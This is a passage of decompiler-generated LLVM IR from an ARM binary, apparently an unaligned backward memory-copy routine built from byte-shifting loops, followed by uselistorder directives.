  store i32 %v5_16b94, i32* %lr.global-to-local, align 4
  %v3_16b98 = mul i32 %v12_16b90, 256
  %v4_16b9c = udiv i32 %v9_16b90, 16777216
  %v5_16b9c = or i32 %v3_16b98, %v4_16b9c
  store i32 %v5_16b9c, i32* @ip, align 4
  %v3_16ba0 = mul i32 %v9_16b90, 256
  %v4_16ba4 = udiv i32 %v6_16b90, 16777216
  %v5_16ba4 = or i32 %v3_16ba0, %v4_16ba4
  store i32 %v5_16ba4, i32* %r5.global-to-local, align 4
  %v3_16ba8 = mul i32 %v6_16b90, 256
  %v4_16bac = udiv i32 %v3_16b90, 16777216
  %v5_16bac = or i32 %v3_16ba8, %v4_16bac
  store i32 %v5_16bac, i32* %r4.global-to-local, align 4
  %v1_16bb0 = add i32 %v0_16bb0, -16
  %v2_16bb0 = inttoptr i32 %v1_16bb0 to i32*
  store i32 %v5_16bac, i32* %v2_16bb0, align 4
  %v4_16bb0 = add i32 %v0_16bb0, -12
  %v5_16bb0 = inttoptr i32 %v4_16bb0 to i32*
  %v6_16bb0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_16bb0, i32* %v5_16bb0, align 4
  %v7_16bb0 = add i32 %v0_16bb0, -8
  %v8_16bb0 = inttoptr i32 %v7_16bb0 to i32*
  %v9_16bb0 = load i32, i32* @ip, align 4
  store i32 %v9_16bb0, i32* %v8_16bb0, align 4
  %v10_16bb0 = add i32 %v0_16bb0, -4
  %v11_16bb0 = inttoptr i32 %v10_16bb0 to i32*
  %v12_16bb0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16bb0, i32* %v11_16bb0, align 4
  store i32 %v1_16bb0, i32* %r0.global-to-local, align 4
  %v0_16bb4 = load i32, i32* %r2.global-to-local, align 4
  %v2_16bb4 = add i32 %v0_16bb4, -16
  store i32 %v2_16bb4, i32* %r2.global-to-local, align 4
  %v6_16bb8 = icmp slt i32 %v0_16bb4, 16
  br i1 %v6_16bb8, label %dec_label_pc_16bbc, label %dec_label_pc_16b8c.dec_label_pc_16b8c_crit_edge

dec_label_pc_16b8c.dec_label_pc_16b8c_crit_edge:  ; preds = %dec_label_pc_16b8c
  %v0_16b8c.pre = load i32, i32* @r3, align 4
  %v0_16b90.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16b8c

dec_label_pc_16bbc:                               ; preds = %dec_label_pc_16b8c
  %v2_16bbc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16bbc, i32* @r4, align 4
  %v5_16bbc = load i8*, i8** %stack_var_-8, align 4
  %v6_16bbc = ptrtoint i8* %v5_16bbc to i32
  store i32 %v6_16bbc, i32* @r5, align 4
  store i32 %v11_16b88, i32* @lr, align 4
  %v2_16bc0 = add i32 %v0_16bb4, -4
  store i32 %v2_16bc0, i32* %r2.global-to-local, align 4
  %v4_16bc0 = add i32 %v0_16bb4, 2147483632
  %v5_16bc0 = and i32 %v2_16bc0, %v4_16bc0
  %v6_16bc0 = icmp slt i32 %v5_16bc0, 0
  store i1 %v6_16bc0, i1* %cpsr_v.global-to-local, align 1
  %v7_16bc0 = icmp slt i32 %v2_16bc0, 0
  store i1 %v7_16bc0, i1* %cpsr_n.global-to-local, align 1
  %v8_16bc0 = icmp eq i32 %v2_16bc0, 0
  store i1 %v8_16bc0, i1* %cpsr_z.global-to-local, align 1
  %v5_16bc4 = icmp slt i32 %v2_16bb4, -12
  br i1 %v5_16bc4, label %dec_label_pc_16be0, label %dec_label_pc_16bc8

dec_label_pc_16bc8:                               ; preds = %dec_label_pc_16bbc, %dec_label_pc_16b7c, %dec_label_pc_16bc8
  %v1_16bd4 = phi i32 [ %v5_16bd4, %dec_label_pc_16bc8 ], [ %v1_16bb0, %dec_label_pc_16bbc ], [ %v0_16bb019, %dec_label_pc_16b7c ]
  %v0_16bc8 = load i32, i32* @r3, align 4
  %v3_16bc8 = mul i32 %v0_16bc8, 256
  store i32 %v3_16bc8, i32* %ip.global-to-local, align 4
  %v0_16bcc = load i32, i32* %r1.global-to-local, align 4
  %v1_16bcc = add i32 %v0_16bcc, -4
  %v2_16bcc = inttoptr i32 %v1_16bcc to i32*
  %v3_16bcc = load i32, i32* %v2_16bcc, align 4
  store i32 %v3_16bcc, i32* @r3, align 4
  store i32 %v1_16bcc, i32* %r1.global-to-local, align 4
  %v4_16bd0 = udiv i32 %v3_16bcc, 16777216
  %v5_16bd0 = or i32 %v4_16bd0, %v3_16bc8
  store i32 %v5_16bd0, i32* @ip, align 4
  %v2_16bd4 = add i32 %v1_16bd4, -4
  %v3_16bd4 = inttoptr i32 %v2_16bd4 to i32*
  store i32 %v5_16bd0, i32* %v3_16bd4, align 4
  %v4_16bd4 = load i32, i32* %r0.global-to-local, align 4
  %v5_16bd4 = add i32 %v4_16bd4, -4
  store i32 %v5_16bd4, i32* %r0.global-to-local, align 4
  %v0_16bd8 = load i32, i32* %r2.global-to-local, align 4
  %v2_16bd8 = add i32 %v0_16bd8, -4
  store i32 %v2_16bd8, i32* %r2.global-to-local, align 4
  %v6_16bdc = icmp slt i32 %v0_16bd8, 4
  br i1 %v6_16bdc, label %dec_label_pc_16be0.loopexit, label %dec_label_pc_16bc8

dec_label_pc_16be0.loopexit:                      ; preds = %dec_label_pc_16bc8
  %v4_16bd8 = sub i32 3, %v0_16bd8
  %v5_16bd8 = and i32 %v4_16bd8, %v0_16bd8
  %v6_16bd8 = icmp slt i32 %v5_16bd8, 0
  %v7_16bd8 = icmp slt i32 %v2_16bd8, 0
  store i1 %v6_16bd8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16bd8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16be0

dec_label_pc_16be0:                               ; preds = %dec_label_pc_16be0.loopexit, %dec_label_pc_16bbc
  %v2_16b2451 = phi i32 [ %v5_16bd4, %dec_label_pc_16be0.loopexit ], [ %v1_16bb0, %dec_label_pc_16bbc ]
  %v0_16b1447 = phi i32 [ %v2_16bd8, %dec_label_pc_16be0.loopexit ], [ %v2_16bc0, %dec_label_pc_16bbc ]
  %v0_16be0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16be0 = add i32 %v0_16be0, 3
  store i32 %v1_16be0, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_16be8:                               ; preds = %dec_label_pc_16b78
  br i1 %v5_16c58, label %dec_label_pc_16c34, label %dec_label_pc_16bf0

dec_label_pc_16bf0:                               ; preds = %dec_label_pc_16be8
  store i32 %v2_16c54, i32* %r2.global-to-local, align 4
  %v3_16bf4 = load i32, i32* @r4, align 4
  store i32 %v3_16bf4, i32* %stack_var_-12, align 4
  %v6_16bf4 = load i32, i32* @r5, align 4
  %v8_16bf4 = inttoptr i32 %v6_16bf4 to i8*
  store i8* %v8_16bf4, i8** %stack_var_-8, align 4
  %v11_16bf4 = load i32, i32* @lr, align 4
  br label %dec_label_pc_16bf8

dec_label_pc_16bf8:                               ; preds = %dec_label_pc_16bf8.dec_label_pc_16bf8_crit_edge, %dec_label_pc_16bf0
  %v0_16c1c = phi i32 [ %v1_16c1c, %dec_label_pc_16bf8.dec_label_pc_16bf8_crit_edge ], [ %v0_16bb019, %dec_label_pc_16bf0 ]
  %v0_16bfc = phi i32 [ %v0_16bfc.pre, %dec_label_pc_16bf8.dec_label_pc_16bf8_crit_edge ], [ %v1_16b68, %dec_label_pc_16bf0 ]
  %v0_16bf8 = phi i32 [ %v0_16bf8.pre, %dec_label_pc_16bf8.dec_label_pc_16bf8_crit_edge ], [ %v2_16b6c, %dec_label_pc_16bf0 ]
  %v3_16bf8 = mul i32 %v0_16bf8, 65536
  store i32 %v3_16bf8, i32* %lr.global-to-local, align 4
  %v1_16bfc = add i32 %v0_16bfc, -4
  %v2_16bfc = inttoptr i32 %v1_16bfc to i32*
  %v3_16bfc = load i32, i32* %v2_16bfc, align 4
  store i32 %v3_16bfc, i32* @r3, align 4
  %v4_16bfc = add i32 %v0_16bfc, -8
  %v5_16bfc = inttoptr i32 %v4_16bfc to i32*
  %v6_16bfc = load i32, i32* %v5_16bfc, align 4
  store i32 %v6_16bfc, i32* %r4.global-to-local, align 4
  %v7_16bfc = add i32 %v0_16bfc, -12
  %v8_16bfc = inttoptr i32 %v7_16bfc to i32*
  %v9_16bfc = load i32, i32* %v8_16bfc, align 4
  store i32 %v9_16bfc, i32* %r5.global-to-local, align 4
  %v10_16bfc = add i32 %v0_16bfc, -16
  %v11_16bfc = inttoptr i32 %v10_16bfc to i32*
  %v12_16bfc = load i32, i32* %v11_16bfc, align 4
  store i32 %v10_16bfc, i32* %r1.global-to-local, align 4
  %v4_16c00 = udiv i32 %v12_16bfc, 65536
  %v5_16c00 = or i32 %v4_16c00, %v3_16bf8
  store i32 %v5_16c00, i32* %lr.global-to-local, align 4
  %v3_16c04 = mul i32 %v12_16bfc, 65536
  %v4_16c08 = udiv i32 %v9_16bfc, 65536
  %v5_16c08 = or i32 %v3_16c04, %v4_16c08
  store i32 %v5_16c08, i32* @ip, align 4
  %v3_16c0c = mul i32 %v9_16bfc, 65536
  %v4_16c10 = udiv i32 %v6_16bfc, 65536
  %v5_16c10 = or i32 %v3_16c0c, %v4_16c10
  store i32 %v5_16c10, i32* %r5.global-to-local, align 4
  %v3_16c14 = mul i32 %v6_16bfc, 65536
  %v4_16c18 = udiv i32 %v3_16bfc, 65536
  %v5_16c18 = or i32 %v3_16c14, %v4_16c18
  store i32 %v5_16c18, i32* %r4.global-to-local, align 4
  %v1_16c1c = add i32 %v0_16c1c, -16
  %v2_16c1c = inttoptr i32 %v1_16c1c to i32*
  store i32 %v5_16c18, i32* %v2_16c1c, align 4
  %v4_16c1c = add i32 %v0_16c1c, -12
  %v5_16c1c = inttoptr i32 %v4_16c1c to i32*
  %v6_16c1c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_16c1c, i32* %v5_16c1c, align 4
  %v7_16c1c = add i32 %v0_16c1c, -8
  %v8_16c1c = inttoptr i32 %v7_16c1c to i32*
  %v9_16c1c = load i32, i32* @ip, align 4
  store i32 %v9_16c1c, i32* %v8_16c1c, align 4
  %v10_16c1c = add i32 %v0_16c1c, -4
  %v11_16c1c = inttoptr i32 %v10_16c1c to i32*
  %v12_16c1c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16c1c, i32* %v11_16c1c, align 4
  store i32 %v1_16c1c, i32* %r0.global-to-local, align 4
  %v0_16c20 = load i32, i32* %r2.global-to-local, align 4
  %v2_16c20 = add i32 %v0_16c20, -16
  store i32 %v2_16c20, i32* %r2.global-to-local, align 4
  %v6_16c24 = icmp slt i32 %v0_16c20, 16
  br i1 %v6_16c24, label %dec_label_pc_16c28, label %dec_label_pc_16bf8.dec_label_pc_16bf8_crit_edge

dec_label_pc_16bf8.dec_label_pc_16bf8_crit_edge:  ; preds = %dec_label_pc_16bf8
  %v0_16bf8.pre = load i32, i32* @r3, align 4
  %v0_16bfc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16bf8

dec_label_pc_16c28:                               ; preds = %dec_label_pc_16bf8
  %v2_16c28 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16c28, i32* @r4, align 4
  %v5_16c28 = load i8*, i8** %stack_var_-8, align 4
  %v6_16c28 = ptrtoint i8* %v5_16c28 to i32
  store i32 %v6_16c28, i32* @r5, align 4
  store i32 %v11_16bf4, i32* @lr, align 4
  %v2_16c2c = add i32 %v0_16c20, -4
  store i32 %v2_16c2c, i32* %r2.global-to-local, align 4
  %v4_16c2c = add i32 %v0_16c20, 2147483632
  %v5_16c2c = and i32 %v2_16c2c, %v4_16c2c
  %v6_16c2c = icmp slt i32 %v5_16c2c, 0
  store i1 %v6_16c2c, i1* %cpsr_v.global-to-local, align 1
  %v7_16c2c = icmp slt i32 %v2_16c2c, 0
  store i1 %v7_16c2c, i1* %cpsr_n.global-to-local, align 1
  %v8_16c2c = icmp eq i32 %v2_16c2c, 0
  store i1 %v8_16c2c, i1* %cpsr_z.global-to-local, align 1
  %v5_16c30 = icmp slt i32 %v2_16c20, -12
  br i1 %v5_16c30, label %dec_label_pc_16c4c, label %dec_label_pc_16c34

dec_label_pc_16c34:                               ; preds = %dec_label_pc_16c28, %dec_label_pc_16be8, %dec_label_pc_16c34
  %v1_16c40 = phi i32 [ %v5_16c40, %dec_label_pc_16c34 ], [ %v1_16c1c, %dec_label_pc_16c28 ], [ %v0_16bb019, %dec_label_pc_16be8 ]
  %v0_16c34 = load i32, i32* @r3, align 4
  %v3_16c34 = mul i32 %v0_16c34, 65536
  store i32 %v3_16c34, i32* %ip.global-to-local, align 4
  %v0_16c38 = load i32, i32* %r1.global-to-local, align 4
  %v1_16c38 = add i32 %v0_16c38, -4
  %v2_16c38 = inttoptr i32 %v1_16c38 to i32*
  %v3_16c38 = load i32, i32* %v2_16c38, align 4
  store i32 %v3_16c38, i32* @r3, align 4
  store i32 %v1_16c38, i32* %r1.global-to-local, align 4
  %v4_16c3c = udiv i32 %v3_16c38, 65536
  %v5_16c3c = or i32 %v4_16c3c, %v3_16c34
  store i32 %v5_16c3c, i32* @ip, align 4
  %v2_16c40 = add i32 %v1_16c40, -4
  %v3_16c40 = inttoptr i32 %v2_16c40 to i32*
  store i32 %v5_16c3c, i32* %v3_16c40, align 4
  %v4_16c40 = load i32, i32* %r0.global-to-local, align 4
  %v5_16c40 = add i32 %v4_16c40, -4
  store i32 %v5_16c40, i32* %r0.global-to-local, align 4
  %v0_16c44 = load i32, i32* %r2.global-to-local, align 4
  %v2_16c44 = add i32 %v0_16c44, -4
  store i32 %v2_16c44, i32* %r2.global-to-local, align 4
  %v6_16c48 = icmp slt i32 %v0_16c44, 4
  br i1 %v6_16c48, label %dec_label_pc_16c4c.loopexit, label %dec_label_pc_16c34

dec_label_pc_16c4c.loopexit:                      ; preds = %dec_label_pc_16c34
  %v4_16c44 = sub i32 3, %v0_16c44
  %v5_16c44 = and i32 %v4_16c44, %v0_16c44
  %v6_16c44 = icmp slt i32 %v5_16c44, 0
  %v7_16c44 = icmp slt i32 %v2_16c44, 0
  store i1 %v6_16c44, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16c44, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16c4c

dec_label_pc_16c4c:                               ; preds = %dec_label_pc_16c4c.loopexit, %dec_label_pc_16c28
  %v2_16b2452 = phi i32 [ %v5_16c40, %dec_label_pc_16c4c.loopexit ], [ %v1_16c1c, %dec_label_pc_16c28 ]
  %v0_16b1448 = phi i32 [ %v2_16c44, %dec_label_pc_16c4c.loopexit ], [ %v2_16c2c, %dec_label_pc_16c28 ]
  %v0_16c4c = load i32, i32* %r1.global-to-local, align 4
  %v1_16c4c = add i32 %v0_16c4c, 2
  store i32 %v1_16c4c, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_16c54:                               ; preds = %dec_label_pc_16b68
  br i1 %v5_16c58, label %dec_label_pc_16ca0, label %dec_label_pc_16c5c

dec_label_pc_16c5c:                               ; preds = %dec_label_pc_16c54
  store i32 %v2_16c54, i32* %r2.global-to-local, align 4
  %v3_16c60 = load i32, i32* @r4, align 4
  store i32 %v3_16c60, i32* %stack_var_-12, align 4
  %v6_16c60 = load i32, i32* @r5, align 4
  %v8_16c60 = inttoptr i32 %v6_16c60 to i8*
  store i8* %v8_16c60, i8** %stack_var_-8, align 4
  %v11_16c60 = load i32, i32* @lr, align 4
  br label %dec_label_pc_16c64

dec_label_pc_16c64:                               ; preds = %dec_label_pc_16c64.dec_label_pc_16c64_crit_edge, %dec_label_pc_16c5c
  %v0_16c88 = phi i32 [ %v1_16c88, %dec_label_pc_16c64.dec_label_pc_16c64_crit_edge ], [ %v0_16bb019, %dec_label_pc_16c5c ]
  %v0_16c68 = phi i32 [ %v0_16c68.pre, %dec_label_pc_16c64.dec_label_pc_16c64_crit_edge ], [ %v1_16b68, %dec_label_pc_16c5c ]
  %v0_16c64 = phi i32 [ %v0_16c64.pre, %dec_label_pc_16c64.dec_label_pc_16c64_crit_edge ], [ %v2_16b6c, %dec_label_pc_16c5c ]
  %v3_16c64 = mul i32 %v0_16c64, 16777216
  store i32 %v3_16c64, i32* %lr.global-to-local, align 4
  %v1_16c68 = add i32 %v0_16c68, -4
  %v2_16c68 = inttoptr i32 %v1_16c68 to i32*
  %v3_16c68 = load i32, i32* %v2_16c68, align 4
  store i32 %v3_16c68, i32* @r3, align 4
  %v4_16c68 = add i32 %v0_16c68, -8
  %v5_16c68 = inttoptr i32 %v4_16c68 to i32*
  %v6_16c68 = load i32, i32* %v5_16c68, align 4
  store i32 %v6_16c68, i32* %r4.global-to-local, align 4
  %v7_16c68 = add i32 %v0_16c68, -12
  %v8_16c68 = inttoptr i32 %v7_16c68 to i32*
  %v9_16c68 = load i32, i32* %v8_16c68, align 4
  store i32 %v9_16c68, i32* %r5.global-to-local, align 4
  %v10_16c68 = add i32 %v0_16c68, -16
  %v11_16c68 = inttoptr i32 %v10_16c68 to i32*
  %v12_16c68 = load i32, i32* %v11_16c68, align 4
  store i32 %v10_16c68, i32* %r1.global-to-local, align 4
  %v4_16c6c = udiv i32 %v12_16c68, 256
  %v5_16c6c = or i32 %v4_16c6c, %v3_16c64
  store i32 %v5_16c6c, i32* %lr.global-to-local, align 4
  %v3_16c70 = mul i32 %v12_16c68, 16777216
  %v4_16c74 = udiv i32 %v9_16c68, 256
  %v5_16c74 = or i32 %v3_16c70, %v4_16c74
  store i32 %v5_16c74, i32* @ip, align 4
  %v3_16c78 = mul i32 %v9_16c68, 16777216
  %v4_16c7c = udiv i32 %v6_16c68, 256
  %v5_16c7c = or i32 %v3_16c78, %v4_16c7c
  store i32 %v5_16c7c, i32* %r5.global-to-local, align 4
  %v3_16c80 = mul i32 %v6_16c68, 16777216
  %v4_16c84 = udiv i32 %v3_16c68, 256
  %v5_16c84 = or i32 %v3_16c80, %v4_16c84
  store i32 %v5_16c84, i32* %r4.global-to-local, align 4
  %v1_16c88 = add i32 %v0_16c88, -16
  %v2_16c88 = inttoptr i32 %v1_16c88 to i32*
  store i32 %v5_16c84, i32* %v2_16c88, align 4
  %v4_16c88 = add i32 %v0_16c88, -12
  %v5_16c88 = inttoptr i32 %v4_16c88 to i32*
  %v6_16c88 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_16c88, i32* %v5_16c88, align 4
  %v7_16c88 = add i32 %v0_16c88, -8
  %v8_16c88 = inttoptr i32 %v7_16c88 to i32*
  %v9_16c88 = load i32, i32* @ip, align 4
  store i32 %v9_16c88, i32* %v8_16c88, align 4
  %v10_16c88 = add i32 %v0_16c88, -4
  %v11_16c88 = inttoptr i32 %v10_16c88 to i32*
  %v12_16c88 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16c88, i32* %v11_16c88, align 4
  store i32 %v1_16c88, i32* %r0.global-to-local, align 4
  %v0_16c8c = load i32, i32* %r2.global-to-local, align 4
  %v2_16c8c = add i32 %v0_16c8c, -16
  store i32 %v2_16c8c, i32* %r2.global-to-local, align 4
  %v6_16c90 = icmp slt i32 %v0_16c8c, 16
  br i1 %v6_16c90, label %dec_label_pc_16c94, label %dec_label_pc_16c64.dec_label_pc_16c64_crit_edge

dec_label_pc_16c64.dec_label_pc_16c64_crit_edge:  ; preds = %dec_label_pc_16c64
  %v0_16c64.pre = load i32, i32* @r3, align 4
  %v0_16c68.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16c64

dec_label_pc_16c94:                               ; preds = %dec_label_pc_16c64
  %v2_16c94 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16c94, i32* @r4, align 4
  %v5_16c94 = load i8*, i8** %stack_var_-8, align 4
  %v6_16c94 = ptrtoint i8* %v5_16c94 to i32
  store i32 %v6_16c94, i32* @r5, align 4
  store i32 %v11_16c60, i32* @lr, align 4
  %v2_16c98 = add i32 %v0_16c8c, -4
  store i32 %v2_16c98, i32* %r2.global-to-local, align 4
  %v4_16c98 = add i32 %v0_16c8c, 2147483632
  %v5_16c98 = and i32 %v2_16c98, %v4_16c98
  %v6_16c98 = icmp slt i32 %v5_16c98, 0
  store i1 %v6_16c98, i1* %cpsr_v.global-to-local, align 1
  %v7_16c98 = icmp slt i32 %v2_16c98, 0
  store i1 %v7_16c98, i1* %cpsr_n.global-to-local, align 1
  %v8_16c98 = icmp eq i32 %v2_16c98, 0
  store i1 %v8_16c98, i1* %cpsr_z.global-to-local, align 1
  %v5_16c9c = icmp slt i32 %v2_16c8c, -12
  br i1 %v5_16c9c, label %dec_label_pc_16cb8, label %dec_label_pc_16ca0

dec_label_pc_16ca0:                               ; preds = %dec_label_pc_16c94, %dec_label_pc_16c54, %dec_label_pc_16ca0
  %v1_16cac = phi i32 [ %v5_16cac, %dec_label_pc_16ca0 ], [ %v1_16c88, %dec_label_pc_16c94 ], [ %v0_16bb019, %dec_label_pc_16c54 ]
  %v0_16ca0 = load i32, i32* @r3, align 4
  %v3_16ca0 = mul i32 %v0_16ca0, 16777216
  store i32 %v3_16ca0, i32* %ip.global-to-local, align 4
  %v0_16ca4 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ca4 = add i32 %v0_16ca4, -4
  %v2_16ca4 = inttoptr i32 %v1_16ca4 to i32*
  %v3_16ca4 = load i32, i32* %v2_16ca4, align 4
  store i32 %v3_16ca4, i32* @r3, align 4
  store i32 %v1_16ca4, i32* %r1.global-to-local, align 4
  %v4_16ca8 = udiv i32 %v3_16ca4, 256
  %v5_16ca8 = or i32 %v4_16ca8, %v3_16ca0
  store i32 %v5_16ca8, i32* @ip, align 4
  %v2_16cac = add i32 %v1_16cac, -4
  %v3_16cac = inttoptr i32 %v2_16cac to i32*
  store i32 %v5_16ca8, i32* %v3_16cac, align 4
  %v4_16cac = load i32, i32* %r0.global-to-local, align 4
  %v5_16cac = add i32 %v4_16cac, -4
  store i32 %v5_16cac, i32* %r0.global-to-local, align 4
  %v0_16cb0 = load i32, i32* %r2.global-to-local, align 4
  %v2_16cb0 = add i32 %v0_16cb0, -4
  store i32 %v2_16cb0, i32* %r2.global-to-local, align 4
  %v6_16cb4 = icmp slt i32 %v0_16cb0, 4
  br i1 %v6_16cb4, label %dec_label_pc_16cb8.loopexit, label %dec_label_pc_16ca0

dec_label_pc_16cb8.loopexit:                      ; preds = %dec_label_pc_16ca0
  %v4_16cb0 = sub i32 3, %v0_16cb0
  %v5_16cb0 = and i32 %v4_16cb0, %v0_16cb0
  %v6_16cb0 = icmp slt i32 %v5_16cb0, 0
  %v7_16cb0 = icmp slt i32 %v2_16cb0, 0
  store i1 %v6_16cb0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16cb0, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16cb8

dec_label_pc_16cb8:                               ; preds = %dec_label_pc_16cb8.loopexit, %dec_label_pc_16c94
  %v2_16b2453 = phi i32 [ %v5_16cac, %dec_label_pc_16cb8.loopexit ], [ %v1_16c88, %dec_label_pc_16c94 ]
  %v0_16b1449 = phi i32 [ %v2_16cb0, %dec_label_pc_16cb8.loopexit ], [ %v2_16c98, %dec_label_pc_16c94 ]
  %v0_16cb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_16cb8 = add i32 %v0_16cb8, 1
  store i32 %v1_16cb8, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_16cac, { 0, 2, 1 }
  uselistorder i32 %v3_16ca0, { 1, 0 }
  uselistorder i32 %v2_16c98, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16c88, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_16c68, { 1, 0 }
  uselistorder i32 %v3_16c64, { 1, 0 }
  uselistorder i32 %v0_16c68, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16c88, { 3, 2, 1, 0 }
  uselistorder i32 %v5_16c40, { 0, 2, 1 }
  uselistorder i32 %v3_16c34, { 1, 0 }
  uselistorder i32 %v2_16c2c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16c1c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_16bfc, { 1, 0 }
  uselistorder i32 %v3_16bf8, { 1, 0 }
  uselistorder i32 %v0_16bfc, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16c1c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_16bd4, { 0, 2, 1 }
  uselistorder i32 %v3_16bc8, { 1, 0 }
  uselistorder i32 %v2_16bc0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16bb0, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_16b90, { 1, 0 }
  uselistorder i32 %v3_16b8c, { 1, 0 }
  uselistorder i32 %v0_16b90, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16bb0, { 3, 2, 1, 0 }
  uselistorder i1 %v5_16c58, { 2, 0, 1 }
  uselistorder i32 %v0_16b70, { 1, 0 }
  uselistorder i32 %v0_16c5c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_16bb019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_16b60, { 2, 1, 0 }
  uselistorder i32 %v0_16b60, { 2, 0, 1 }
  uselistorder i32 %v2_16b58, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_16b58, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16b58, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_16bb020, { 2, 1, 0 }
  uselistorder i32 %v11_16b34, { 1, 0 }
  uselistorder i32 %v7_16b34, { 1, 0 }
  uselistorder i32 %v1_16b14, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_16b14, { 1, 2, 0, 3 }
  uselistorder i32 %v2_16b18, { 1, 0 }
  uselistorder i32 %v7_16b0c, { 0, 2, 1 }
  uselistorder i32 %v10_16b08, { 1, 0 }
  uselistorder i32 %v9_16b00, { 1, 0, 2 }
  uselistorder i32 %v6_16afc, { 1, 0 }
  uselistorder i32 %v2_16af4, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_16af4, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_16b04, { 0, 3, 2, 1 }
  uselistorder i32 %v7_16ae8, { 0, 2, 1 }
  uselistorder i32 %v13_16ae4, { 1, 0 }
  uselistorder i32 %v4_16ae0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_16ae0, { 2, 0, 1 }
  uselistorder i32 %v6_16ae8, { 0, 3, 2, 1 }
  uselistorder i32 %v7_16ad8, { 0, 2, 1 }
  uselistorder i32 %v16_16ad4, { 1, 0 }
  uselistorder i32 %v4_16ad0, { 1, 2, 0 }
  uselistorder i32 %v0_16ae0.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_16ad8, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_16ac4, { 0, 3, 2, 1 }
  uselistorder i32 %v10_16ac0, { 1, 0 }
  uselistorder i32 %v1_16abc, { 1, 0 }
  uselistorder i32 %v10_16ab8, { 1, 0 }
  uselistorder i32 %v0_16ab8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16abc, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_16ab0, { 0, 2, 1 }
  uselistorder i32 %v2_16aa4, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_16aa4, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_16abc37, { 1, 2, 0 }
  uselistorder i32 %v1_16a9c, { 2, 1, 0 }
  uselistorder i32 %v1_16a94, { 2, 3, 1, 0 }
  uselistorder i32 %v2_16a8c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_16a88, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_16a84, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_16a84, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_16a74, { 0, 2, 1 }
  uselistorder i32 %v4_16a70, { 1, 0 }
  uselistorder i32 %v3_16a64, { 1, 0 }
  uselistorder i32 %v1_16a5c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16a50, { 1, 0 }
  uselistorder i32 %v12_16a4c, { 0, 2, 1 }
  uselistorder i32 %v8_16a2c, { 1, 0, 2 }
  uselistorder i32 %v5_16a2c, { 1, 0, 2 }
  uselistorder i32 %v2_16a2c, { 1, 0, 2 }
  uselistorder i32 %v0_16a2c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16a4c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_16a08, { 0, 2, 1 }
  uselistorder i32 %v4_16a04, { 1, 0 }
  uselistorder i32 %v3_169f8, { 1, 0 }
  uselistorder i32 %v1_169f0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_169e4, { 1, 0 }
  uselistorder i32 %v12_169e0, { 0, 2, 1 }
  uselistorder i32 %v8_169c0, { 1, 0, 2 }
  uselistorder i32 %v5_169c0, { 1, 0, 2 }
  uselistorder i32 %v2_169c0, { 1, 0, 2 }
  uselistorder i32 %v0_169c0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_169e0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1699c, { 0, 2, 1 }
  uselistorder i32 %v4_16998, { 1, 0 }
  uselistorder i32 %v3_1698c, { 1, 0 }
  uselistorder i32 %v1_16984, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16978, { 1, 0 }
  uselistorder i32 %v12_16974, { 0, 2, 1 }
